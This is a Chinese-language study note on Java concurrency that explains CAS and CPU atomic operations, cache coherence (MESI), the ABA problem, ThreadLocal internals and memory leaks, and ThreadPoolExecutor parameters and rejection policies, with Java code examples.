<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取传入对象o在内存中偏移量为offset位置的值与期望值expected作比较。相等就把x值赋值给offset位置的值。方法返回true。不相等，就取消赋值，方法返回false。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">compareAndSwapInt</span><span class="params">(Object o, <span class="type">long</span> offset,</span></span><br><span class="line"><span class="params">                                              <span class="type">int</span> expected,</span></span><br><span class="line"><span class="params">                                              <span class="type">int</span> x)</span>;</span><br></pre></td></tr></table></figure>

<p>CAS的全称为Compare And Swap，直译就是比较交换。是一条CPU的原子指令，其作用是让CPU先进行比较两个值是否相等，然后原子地更新某个位置的值，其实现方式是基于硬件平台的汇编指令，在intel的CPU中，使用的是cmpxchg指令，就是说CAS是靠硬件实现的，从而在硬件层面提升效率。</p>
<p>它是一个无锁的原子算法。所以它就是一个乐观锁，也就是不加锁。无锁也就没有加锁和解锁的过程，不存在阻塞，也就提高了效率，提高了CPU的吞吐量（单位时间内执行完成的操作条数就多了）</p>
<h3 id="CPU实现原子操作的原理"><a href="#CPU实现原子操作的原理" class="headerlink" title="CPU实现原子操作的原理"></a>CPU实现原子操作的原理</h3><ol>
<li>测试并设置（Tetst-and-Set）</li>
<li>获取并增加（Fetch-and-Increment）</li>
<li>交换（Swap）</li>
<li>比较并交换（Compare-and-Swap）</li>
<li>加载链接&#x2F;条件存储（Load-Linked&#x2F;Store-Conditional）</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848046.png" alt="img"></p>
<p>4.1 处理器自动保证基本内存操作的原子性<br>首先处理器会自动保证基本的内存操作的原子性。处理器保证从系统内存当中读取或者写入一个字节是原子的，意思是当一个处理器读取一个字节时，其他处理器不能访问这个字节的内存地址。奔腾6和最新的处理器能自动保证单处理器对同一个缓存行里进行16&#x2F;32&#x2F;64位的操作是原子的，但是复杂的内存操作处理器不能自动保证其原子性，比如跨总线宽度，跨多个缓存行，跨页表的访问。但是处理器提供总线锁定和缓存锁定两个机制来保证复杂内存操作的原子性。</p>
<p>4.2 通过总线锁定来保证原子性(类似于数据库表锁,重量级锁)<br>总线锁定其实就是处理器使用了总线锁，所谓总线锁就是使用处理器提供的一个 LOCK# 信号，当一个处理器在总线上输出此信号时，其他处理器的请求将被阻塞住，那么该处理器可以独占共享内存。但是该方法成本太大。因此有了下面的方式。</p>
<p>4.3 通过缓存锁定来保证原子性(类似于数据库行锁)<br>在同一时刻我们只需保证对某个内存地址的操作是原子性即可，但总线锁定把CPU和内存之间通信锁住了，这使得锁定期间，其他处理器不能操作其他内存地址的数据，所以总线锁定的开销比较大，最近的处理器在某些场合下使用缓存锁定代替总线锁定。</p>
<p>所谓缓存锁定 是指内存区域如果被缓存在处理器的缓存行中，并且在Lock 操作期间被锁定，那么当它执行操作写回到内存时，处理器不在总线上输出 LOCK# 信号，而是修改内部的内存地址，并允许它的缓存一致性机制来保证操作的原子性，因为缓存一致性机制会阻止同时修改两个以上处理器缓存的内存区域数据（这里和 volatile 的可见性原理相同），当其他处理器回写已被锁定的缓存行的数据时，会使缓存行无效。</p>
<p>注意：有两种情况下处理器不会使用缓存锁定</p>
<p>当操作的数据不能被缓存在处理器内部，或操作的数据跨多个缓存行时，则处理器会调用总线锁定。<br>有些处理器不支持缓存锁定，对于 Intel 486 和 Pentium 处理器，就是锁定的内存区域在处理器的缓存行也会调用总线锁定。</p>
<p>586之前的CPU, 会通过<strong>LOCK</strong>锁总线的形式来实现原子操作. 686开始则提供了存储一致性(Cache coherence), 这是多处理的基础, 也是原子操作的基础.</p>
<p>原子指令在软件上看来逻辑并不复杂，但在微架构上看，成本是很高的。如果我们把CPU 和内存都看做是总线上的一个个独立的实体，有一个CPU要做CAS指令，这个CPU需要先从 内存中读一个值，同时要在内存控制器上设置一个标志，保证其他CPU写不进去，等它比较完了，然后再决定写一个值回去，才会让其他CPU写入。</p>
<p>不同微架构实现有不同方法对行为进行优化，在鲲鹏920(是<a href="https://baike.baidu.com/item/%E5%8D%8E%E4%B8%BA/298705">华为</a>在2019年1月发布的数据中心高性能处理器)上，原子指令的请求需要在 L3Cache上进行排队，保证在原子操作的多个动作之间能维持原子指令要求的语义。这个排队本身也有成本。所以没有原子需要就不要轻易用原子变量，这其实是有成本的。</p>
<p>幸运的是, 缓存一致性协议提供了原子性被保障的基础. 举例来说, 当遇到一个原子指令时, 这个协议知道需要保证原子性. 他首先获得对存储单元M的”独家所有权” (通过将其他包含M的缓存块中的拷贝都置为无效). 当获得独家所有权之后, 这个协议会确保只有一个处理器能够访问这个块, 而如果其他处理器在此时想要访问的话就会经历缓存缺失, 接下来原子指令就可以执行. 在原子指令持续期间, 其他处理器不允许”偷走”这个块. 具体来说, 如通另一个处理器要求读或者写这个块, 这个块就被”偷”了(如块被清理, 块的状态被降级为无效). 在原子指令完成之前暴露块会破坏指令的原子性, ……</p>
<h3 id="CAS的问题-自旋浪费cpu资源"><a href="#CAS的问题-自旋浪费cpu资源" class="headerlink" title="CAS的问题  自旋浪费cpu资源"></a>CAS的问题  自旋浪费cpu资源</h3><p>循环时间太长; 只能保存一个共享变量原子操作; ABA问题;CAS造成Cache一致性流量过大;</p>
<h5 id="ABA问题"><a href="#ABA问题" class="headerlink" title="ABA问题"></a>ABA问题</h5><p>前女友复合后，她可能谈过多个</p>
<p>CAS需要检查操作值有没有发生改变，如果没有发生改变则更新。但是存在这样一种情况：如果一个值原来是A，变成了B，然后又变成了A，那么在CAS检查的时候会发现没有改变，但是实质上它已经发生了改变，这就是所谓的ABA问题。对于ABA问题其解决方案是加上版本号，即在每个变量都加上一个版本号，每次改变时加1，即A —&gt; B —&gt; A，变成1A —&gt; 2B —&gt; 3A。</p>
<p>从Java1.5 开始JDK的atomic包里提供了一个类AtomicStampedReference来解决ABA问题。这个类的compareAndSet方法作用是首先检查当前引用是否等于预期引用，并且当前标志是否等于预期标志，如果全部相等，则以原子方式将该引用和该标志的值设置为给定的更新值。其实就类似于引入了版本概念，给每一个数据都有一个它唯一的版本号，通关检查版本号来判断数据是否被修改。</p>
<h5 id="一致性流量过大问题"><a href="#一致性流量过大问题" class="headerlink" title="一致性流量过大问题"></a>一致性流量过大问题</h5><p>现在几乎所有的锁都是可重入的，即已经获得锁的线程可以多次锁住&#x2F;解锁监视对象，按照之前的HotSpot设计，每次加锁&#x2F;解锁都会涉及到一些CAS操作（比如对等待队列的CAS操作），CAS操作会延迟本地调用(使本地调用不是那么及时)，因此偏向锁的想法是 一旦线程第一次获得了监视对象，之后让监视对象“偏向”这个线程，之后的多次调用则可以避免CAS操作，说白了就是置个变量，如果发现为true则无需再走各种加锁&#x2F;解锁流程。轻量级锁就是基于CAS操作的</p>
<p>CAS为什么会引入本地延迟？这要从SMP（对称多处理器）架构说起，下图大概表明了SMP的结构：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848046.png" alt="img"></p>
<p>其意思是 所有的CPU会共享一条系统总线（BUS），靠此总线连接主存。每个核都有自己的一级缓存，各核相对于BUS对称分布，因此这种结构称为“对称多处理器”。</p>
<p>而CAS的全称为Compare-And-Swap，是一条CPU的原子指令，其作用是让CPU比较后原子地更新某个位置的值，其实现方式是基于硬件平台的汇编指令，就是说CAS是靠硬件实现的，JVM只是封装了汇编调用，那些AtomicInteger类便是使用了这些封装后的接口。</p>
<p>例如：Core1和Core2可能会同时把主存中某个位置的值Load到自己的L1 Cache中，当Core1在自己的L1 Cache中修改这个位置的值时，会通过总线，使Core2中L1 Cache对应的值“失效”，而Core2一旦发现自己L1 Cache中的值失效（称为Cache命中缺失）则会通过总线从内存中加载该地址最新的值，大家通过总线的来回通信称为“Cache一致性流量”，因为总线被设计为固定的“通信能力”，如果Cache一致性流量过大，总线将成为瓶颈。而当Core1和Core2中的值再次一致时，称为“Cache一致性”，从这个层面来说，锁设计的终极目标便是减少Cache一致性流量。</p>
<p>而CAS恰好会导致Cache一致性流量，如果有很多线程都共享同一个对象，当某个Core CAS成功时必然会引起总线风暴，这就是所谓的本地延迟，本质上偏向锁就是为了消除CAS，降低Cache一致性流量。</p>
<p>相关参考：</p>
<p>Cache一致性：<br>上面提到Cache一致性，其实是有协议支持的，现在通用的协议是MESI（最早由Intel开始支持），具体参考：<a href="http://en.wikipedia.org/wiki/MESI_protocol%E3%80%82">http://en.wikipedia.org/wiki/MESI_protocol。</a></p>
<p>Cache一致性流量的例外情况：<br>其实也不是所有的CAS都会导致总线风暴，这跟Cache一致性协议有关，具体参考：<a href="http://blogs.oracle.com/dave/entry/biased_locking_in_hotspot">http://blogs.oracle.com/dave/entry/biased_locking_in_hotspot</a></p>
<p>NUMA(Non Uniform Memory Access Achitecture）架构：<br>与SMP对应还有非对称多处理器架构，现在主要应用在一些高端处理器上，主要特点是没有总线，没有公用主存，每个Core有自己的内存，针对这种结构此处不做讨论。</p>
<h3 id="MESI-缓存一致性协议"><a href="#MESI-缓存一致性协议" class="headerlink" title="MESI(缓存一致性协议)"></a>MESI(缓存一致性协议)</h3><p>首先，由于CPU和内存的速度不匹配，所以有了CPU高速缓存，现代CPU的缓存一般分为3级，L1，L2，L3，通常来讲，一个多核处理器上，每个CPU核心都有自己的L1和L2 Cache，L3 Cache则是被所有核心共享的。CPU读取某一数据时，会先从缓存中读，若缓存read miss，则将数据从主存加载到缓存。缓存中的一个数据单位称为一个缓存行（cache line），通常是64字节，从主存中加载数据到缓存，不是一次加载一个字节，而是一次加载一个缓存行。</p>
<p>Modified</p>
<p>该cache line只存在于当前cache，而不存在于其他cache，并且该cache line的数据与主存中的数据不一致，是脏数据（dirty）</p>
<p>Exclusive</p>
<p>该cache line只存在于当前cache，而不存在于其他cache，并且该cache line的数据与主存中的数据一致，是clean的</p>
<p>Shared</p>
<p>该cache line存在于多个cache中，并且该cache line 的数据与主存中的数据一致</p>
<p>Invalid</p>
<p>该cache line 失效</p>
<h2 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h2><p>如果你创建了一个ThreadLocal变量，那么访问这个变量的每个线程都会有这个变量的本地副本，这也是ThreadLocal变量名的由来。他们可以使用 get（） 和 set（） 方法来获取默认值或将其值更改为当前线程所存的副本的值，从而避免了线程安全问题。</p>
<h3 id="ThreadLocal使用场景"><a href="#ThreadLocal使用场景" class="headerlink" title="ThreadLocal使用场景"></a>ThreadLocal使用场景</h3><p>假设多个函数递归调用, 这个时候最里面的那个函数想要获取刚开始的那个函数的值, 这个时候里面有某个函数是系统库里的函数, 参数传不下去, 用static多线程下会不安全,可以用ThreadLocal; </p>
<p>spring里面@Transactional 注解, 标注某个方法需要支持事务,  这个方法里面调用了几个方法, 然后connection怎么传, 每一个线程用的connection必须是同一个,会放到ThreadLocal;mybatis关于分页的处理</p>
<h4 id="在项目中使用到的地方"><a href="#在项目中使用到的地方" class="headerlink" title="在项目中使用到的地方"></a>在项目中使用到的地方</h4><p>获取登录用户信息, 既然要把用户id作为集合名称的一部分, 我们必须在请求进入交易服务时就获取到用户信息, 并且将当前用户信息与当前请求线程绑定;</p>
<p>获取用户的思路分析: </p>
<ul>
<li>页面直接把用户作为请求参数传递: 优点:简单、方便, 代码量为0; 缺点: 不安全, 因为调用购物车CRUD的请求时从页面发过来的, 我们不能确定这个传递过来的id是不是真的是用户的id</li>
<li>自己从cookie的token中解析用户信息: 优点: 安全;  缺点: 需要重复检验JWT, 已经在网关中做过了, 代码麻烦;</li>
</ul>
<p>为了在请求进入服务后直接能拿到用户，我们可以拦截每一个进入controller的请求，统一完成登录用户的获取，这个拦截可以通过SpringMVC的通用拦截器：HandlerInterceptor来实现。</p>
<h3 id="ThreadLocal原理"><a href="#ThreadLocal原理" class="headerlink" title="ThreadLocal原理"></a>ThreadLocal原理</h3><p>Thread类有两个变量,默认情况下这两个变量都是 null，只有当前线程调用 ThreadLocal 类的 set或get方法时才创建它们，实际上调用这两个方法的时候，我们调用的是ThreadLocalMap类对应的 get()、set()方法;</p>
<p>最终的变量是放在了当前线程的 ThreadLocalMap 中，并不是存在 ThreadLocal 上，ThreadLocal 可以理解为只是ThreadLocalMap的封装，传递了变量值。 ThrealLocal 类中可以通过Thread.currentThread()获取到当前线程对象后，直接通过getMap(Thread t)可以访问到该线程的ThreadLocalMap对象。</p>
<p>每个Thread中都具备一个ThreadLocalMap，而ThreadLocalMap可以存储以ThreadLocal为 key ，Object 对象为 value 的键值对。</p>
<p>比如我们在同一个线程中声明了两个 ThreadLocal 对象的话，会使用 Thread内部都是使用仅有那个ThreadLocalMap 存放数据的，ThreadLocalMap的 key 就是 ThreadLocal对象，value 就是 ThreadLocal 对象调用set方法设置的值。</p>
<p>Entry是WeakReference的子类, key是弱引用, 内存不足的时候, threadlocal对象且没有强引用引用的时候会被gc回收;</p>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848057.png" alt="image-20210413202818052" style="zoom: 67%;" />



<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848071.png" alt="image-20210508151923558"></p>
<p>ThreadLocal属于类,设置为static</p>
<h4 id="set-源码"><a href="#set-源码" class="headerlink" title="set()源码"></a>set()源码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(T value)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        <span class="type">ThreadLocalMap</span> <span class="variable">map</span> <span class="operator">=</span> getMap(t);</span><br><span class="line">        <span class="keyword">if</span> (map != <span class="literal">null</span>)</span><br><span class="line">            <span class="comment">// this为ThreadLocal对象</span></span><br><span class="line">            map.set(<span class="built_in">this</span>, value);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            createMap(t, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="ThreadLocal内存泄露问题"><a href="#ThreadLocal内存泄露问题" class="headerlink" title="ThreadLocal内存泄露问题"></a>ThreadLocal内存泄露问题</h3><p>ThreadLocalMap 中使用的 key 为 ThreadLocal 的弱引用,而 value 是强引用。所以，如果 ThreadLocal 没有被外部强引用的情况下，在垃圾回收的时候，key直接会被清理掉(不管内存是否够)，而 value 不会被清理掉。这样一来，ThreadLocalMap 中就会出现 key 为 null 的 Entry。假如我们不做任何措施的话，value 永远无法被 GC 回收，这个时候就可能会产生内存泄露。ThreadLocalMap 实现中已经考虑了这种情况，在调用 set()、get()、remove() 方法的时候，会清理掉 key 为 null 的记录。但是假设长时间不执行get()和set(), 就会造成内存泄漏, 所以使用完 ThreadLocal方法后 最好手动调用remove()方法;</p>
<h4 id="ThreadLocalMap-key为什么用弱引用"><a href="#ThreadLocalMap-key为什么用弱引用" class="headerlink" title="ThreadLocalMap key为什么用弱引用?"></a>ThreadLocalMap key为什么用弱引用?</h4><p>假设是强引用, 即使把tl设置为空, 但是key的引用依然指向threadLocal对象, 所以会有内存泄漏, 而使用弱引用不会, 但是还是会导致内存泄漏的存在, threadLocal被回收, key的值变成null, 则导致整个value再也无法被访问到, 因此依然存在内存泄漏;</p>
<h3 id="在线程池中ThreadLocal使用的问题"><a href="#在线程池中ThreadLocal使用的问题" class="headerlink" title="在线程池中ThreadLocal使用的问题"></a>在线程池中ThreadLocal使用的问题</h3><p>每个线程被拿出去用的时候假如清理threadlocalmap的话, 下次被拿去使用的时候就会出现很多问题, 例如key重复了; 所以线程池使用完会立刻清理Threadlocalmap然后再放回去;</p>
<h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><p> 类比银行柜台; 2个核心柜台,开了之后就一直不关, 一共5个柜台, 剩下3个柜台1个时间没有任务处理就撤掉, 时间单位为小时,  等待区一共有10把椅子, 生产柜台的工厂, 5个柜台满了并且等待区满了就有4种方式拒绝(直接拒绝并抛出异常;直接拒绝,不抛异常;让他回到分配任务的公司去处理业务,假设公司关门则丢弃任务;尝试将第一个柜台取出给他办理业务,不抛异常)</p>
<p>池化技术: 事先准备好一些资源, 有人要用, 就来我这里拿, 用完之后还给我; </p>
<p>好处: 线程复用, 可以控制最大并发数、管理线程;</p>
<h3 id="执行-execute-方法和-submit-方法的区别是什么呢？"><a href="#执行-execute-方法和-submit-方法的区别是什么呢？" class="headerlink" title="执行 execute()方法和 submit()方法的区别是什么呢？"></a>执行 execute()方法和 submit()方法的区别是什么呢？</h3><p>execute()方法用于提交不需要返回值的任务，所以无法判断任务是否被线程池执行成功与否;</p>
<p>submit()方法用于提交需要返回值的任务。线程池会返回一个Future类型的对象，通过这个Future对象可以判断任务是否执行成功，并且可以通过Future的get()方法来获取返回值，get()方法会阻塞当前线程直到任务完成，而使用get（long timeout，TimeUnit unit）&#96;方法则会阻塞当前线程一段时间后立即返回，这时候有可能任务没有执行完。</p>
<h3 id="如何创建线程池"><a href="#如何创建线程池" class="headerlink" title="如何创建线程池"></a>如何创建线程池</h3><p>《阿里巴巴 Java 开发手册》中强制线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险;</p>
<p>Executors 返回线程池对象的弊端如下：</p>
<ul>
<li><strong>FixedThreadPool 和 SingleThreadExecutor</strong> ： 允许请求的队列长度为 Integer.MAX_VALUE ，可能堆积大量的请求，从而导致 OOM。</li>
<li><strong>CachedThreadPool 和 ScheduledThreadPool</strong> ： 允许创建的线程数量为 Integer.MAX_VALUE ，可能会创建大量线程，从而导致 OOM。</li>
<li>Executors.newFixedThreadPool()：无界队列，内存可能被打爆</li>
<li>Executors.newSingleThreadExecutor()：单个线程，效率低，串行。</li>
<li>Executors.newCachedThreadPool()：没有核心线程，最大线程数可能为无限大，内存可能还会爆掉。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> pool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ArrayBlockingQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ThreadPoolExecutor;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 8:04 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Runtime.getRuntime().availableProcessors();</span><br><span class="line">        <span class="type">ThreadPoolExecutor</span> <span class="variable">threadPoolExecutor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(<span class="number">3</span>, max, <span class="number">3</span>, TimeUnit.SECONDS,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">10</span>), Executors.defaultThreadFactory(), <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.CallerRunsPolicy()</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">                threadPoolExecutor.execute(()-&gt; &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName());</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            threadPoolExecutor.shutdown();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="线程池3大方法"><a href="#线程池3大方法" class="headerlink" title="线程池3大方法"></a>线程池3大方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Executors.newSingleThreadExecutor(); <span class="comment">// 单</span></span><br><span class="line">Executors.newFixedThreadPool(<span class="number">5</span>); <span class="comment">// 固定大小 </span></span><br><span class="line">Executors.newCachedThreadPool(); <span class="comment">// 可伸缩</span></span><br></pre></td></tr></table></figure>

<h3 id="线程池的7个参数"><a href="#线程池的7个参数" class="headerlink" title="线程池的7个参数"></a>线程池的7个参数</h3><ul>
<li>corePoolSize : 核心线程数线程数定义了最小可以同时运行的线程数量。</li>
<li>maximumPoolSize : 当队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数。</li>
<li>keepAliveTime:当线程池中的线程数量大于 corePoolSize 的时候，如果这时没有新的任务提交，核心线程外的线程不会立即销毁，而是会等待，直到等待的时间超过了 keepAliveTime才会被回收销毁；</li>
<li>unit : keepAliveTime 参数的时间单位。</li>
<li>workQueue:  当新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，新任务就会被存放在队列中。</li>
<li>threadFactory :executor 创建新线程的时候会用到。</li>
<li>handler :饱和策略。关于饱和策略下面单独介绍一下。</li>
</ul>
<h4 id="最大线程该怎么定义"><a href="#最大线程该怎么定义" class="headerlink" title="最大线程该怎么定义?"></a>最大线程该怎么定义?</h4><p>cpu密集型, 几核就是几, 可以保持cpu的效率最高; 尽量不要线程切换;</p>
<p>io密集型, 15个大型任务, io十分占用资源, 最大线程数要大于15即可, 一般设置为30; 因为如果不多设一点, 一个线程大部分时间都在io, cpu核就浪费了,需要进行线程切换;</p>
<p>计算（CPU）密集型消耗的主要是 CPU 资源，可以将线程数设置为 N（CPU 核心数）+1，比 CPU 核心数多出来的一个线程是为了防止线程偶发的缺页中断，或者其它原因导致的任务暂停而带来的影响。一旦任务暂停，CPU 就会处于空闲状态，而在这种情况下多出来的一个线程就可以充分利用 CPU 的空闲时间。</p>
<p>io密集型系统会用大部分的时间来处理 I&#x2F;O 交互，而线程在处理 I&#x2F;O 的时间段内不会占用 CPU 来处理，这时就可以将 CPU 交出给其它线程使用。因此在 I&#x2F;O 密集型任务的应用中，我们可以多配置一些线程，具体的计算方法是 2N。</p>
<h3 id="线程池的四大饱和策略"><a href="#线程池的四大饱和策略" class="headerlink" title="线程池的四大饱和策略"></a>线程池的四大饱和策略</h3><ul>
<li>ThreadPoolExecutor.AbortPolicy(默认)：抛出 RejectedExecutionException来拒绝新任务的处理。</li>
<li>ThreadPoolExecutor.CallerRunsPolicy：调用执行自己的线程运行任务，也就是直接在调用execute方法的线程中运行(run)被拒绝的任务，如果执行程序已关闭，则会丢弃该任务。因此这种策略会降低对于新任务提交速度，影响程序的整体性能。如果您的应用程序可以承受此延迟并且你要求任何一个任务请求都要被执行的话，你可以选择这个策略。</li>
<li>ThreadPoolExecutor.DiscardPolicy： 不处理新任务，直接丢弃掉, 不抛出异常;</li>
<li>ThreadPoolExecutor.DiscardOldestPolicy： 如果线程池没有关闭, 取出线程池队列的第一个线程, 尝试让该线程去处理任务, 但是如果该线程在忙, 则会直接拒绝,也不抛出异常;</li>
</ul>
<p>举个例子： Spring 通过 ThreadPoolTaskExecutor 或者我们直接通过 ThreadPoolExecutor 的构造函数创建线程池的时候，当我们不指定 RejectedExecutionHandler 饱和策略的话来配置线程池的时候默认使用的是 ThreadPoolExecutor.AbortPolicy。在默认情况下，ThreadPoolExecutor 将抛出 RejectedExecutionException 来拒绝新来的任务 ，这代表你将丢失对这个任务的处理。 对于可伸缩的应用程序，建议使用 ThreadPoolExecutor.CallerRunsPolicy。当最大池被填满时，此策略为我们提供可伸缩队列。（这个直接查看 ThreadPoolExecutor 的构造函数源码就可以看出，比较简单的原因，这里就不贴代码了）</p>
<h3 id="线程池原理分析"><a href="#线程池原理分析" class="headerlink" title="线程池原理分析"></a>线程池原理分析</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848062.png" alt="图解线程池实现原理"></p>
<h3 id="线程池优化"><a href="#线程池优化" class="headerlink" title="线程池优化"></a>线程池优化</h3><ul>
<li>如果想要<strong>降低系统资源的消耗</strong>（cpu使用率，操作系统资源消耗，上下文切换开销），那么可以设置一个比较大的队列容量和一个比较小的线程池容量</li>
<li>如果<strong>队列经常堆积比较多的任务</strong>，并且业务方面需要加快处理速度时，可以适当加大maximumPoolSize，找一些池外线程（临时工）帮忙</li>
<li>timer是单线程的，如果一个线程执行时间很长，会影响下一个执行线程，实际项目中尽可能用ScheduledThreadPoolExecutor，慎用Timer</li>
<li>ScheduledThreadPoolExecutor继承了ThreadPoolExecutor，一般被用来当做延迟队列线程池使用，但是仔细查看他的构造函数可以发现，<strong>最大线程数maximumPoolSize都被设置成默认的Integer.MAX_VALUE</strong>，生产环境上容易造成OOM或者导致服务器性能下降，建议使用消息队列中的延迟队列代替</li>
</ul>
<h3 id="线程池参数动态化"><a href="#线程池参数动态化" class="headerlink" title="线程池参数动态化"></a>线程池参数动态化</h3><p>业务与流量不会总是一成不变的，当初合理的配置可能也会在突发的巨大流量面前兵败如山倒，固定的线程池配置亦是如此，满足当时，却可能顶不住未来。为此，美团团队在博客中提到了<strong>线程池参数动态化</strong>的思路，非常值得精读！</p>
<p><a href="http://xuyk.top/go.html?u=aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYmFZdVg4YUN3UTlQUDZrN1REbDJXdw==">Java线程池实现原理及其在美团业务中的实践</a></p>
<p><code>ctl</code>这个AtomicInteger类型，是对线程池的运行状态和线程池中有效线程的数量进行控制的一个字段， 它同时包含两部分的信息：线程池的运行状态 (runState) 和线程池内有效线程的数量 (workerCount)，高3位保存runState，低29位保存workerCount，两个变量之间互不干扰。用一个变量去存储两个值，可避免在做相关决策时，出现不一致的情况，不必为了维护两者的一致，而占用锁资源。通过阅读线程池源代码也可以发现，经常出现要同时判断线程池运行状态和线程数量的情况。线程池也提供了若干方法去供用户获得线程池当前的运行状态、线程个数。这里都使用的是位运算的方式，相比于基本运算，速度也会快很多。</p>
<p>ThreadPoolExecutor的运行状态和生命周期：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211904470.jpg" alt="图片"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211856318.png" alt="image-20211221185614876"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211855709.png" alt="image-20211221185558185"></p>
<h3 id="当线程池里的线程执行异常会发生什么？"><a href="#当线程池里的线程执行异常会发生什么？" class="headerlink" title="当线程池里的线程执行异常会发生什么？"></a>当线程池里的线程执行异常会发生什么？</h3><p>一个线程出现异常不会影响线程池里面其他线程的正常执行，该异常线程不是被回收而是线程池把这个线程移除掉，同时创建一个新的线程放到线程池中。</p>
<p><strong>异常线程是否会打印异常信息</strong></p>
<ol>
<li>调用方法为 <strong>execute()</strong> ，会打印出堆栈异常日志</li>
<li>调用方法为 <strong>submit()</strong> ，堆栈异常没有输出。但是如果业务需要获取线程返回值，调用了<strong>Future.get()方法</strong>时，可以捕获打印出堆栈异常信息。而很多时候我们可能并不需要获取执行结果，导致异常“被吃”，进而不触发告警信息酿成大祸，<strong>所以个人不建议使用</strong><code>submit()</code>。</li>
</ol>
<blockquote>
<p>两者在使用日志工具打印自定义日志都比较困难，所以个人更推荐结合<strong>jdk8的新特性CompletableFuture</strong>，搭配线程池一起使用，详情可以查看这篇文章：<a href="http://xuyk.top/go.html?u=aHR0cDovL3h1eWsudG9wL3Bvc3RzL2FzeW5jLmh0bWw=">如何优雅地异步编程</a></p>
</blockquote>
<h3 id="如果线上突然宕机，阻塞队列中的任务怎么办？"><a href="#如果线上突然宕机，阻塞队列中的任务怎么办？" class="headerlink" title="如果线上突然宕机，阻塞队列中的任务怎么办？"></a>如果线上突然宕机，阻塞队列中的任务怎么办？</h3><p><strong>阻塞队列中的所有任务会丢失</strong></p>
<p><strong>保证任务不丢失的思路</strong></p>
<ol>
<li>我们可以在提交任务前先进行落库处理，当宕机重启后，再拿出待处理的任务继续执行。</li>
<li>使用消息队列</li>
</ol>
<h3 id="如果线程池的队列满了之后会发生什么事情？"><a href="#如果线程池的队列满了之后会发生什么事情？" class="headerlink" title="如果线程池的队列满了之后会发生什么事情？"></a>如果线程池的队列满了之后会发生什么事情？</h3><p>关键在于 <strong>线程池当前活跃线程数</strong> 与 <strong>最大线程数</strong> 的对比</p>
<ol>
<li>线程池当前活跃线程数 &lt; 最大线程数，则线程池会抽调 池外线程（系统线程）来处理任务</li>
<li>线程池当前活跃线程数 &gt;&#x3D; 最大线程数，会根据线程池的拒绝策略来处理任务</li>
</ol>
<p><strong>保证任务100%被处理的思路</strong>： 自定义拒绝策略，把任务交给其他负载低的线程池进行处理，或者放入消息队列交给其他线程池处理 &#x2F; 阻塞队列处理完毕后处理消息队列中的任务</p>
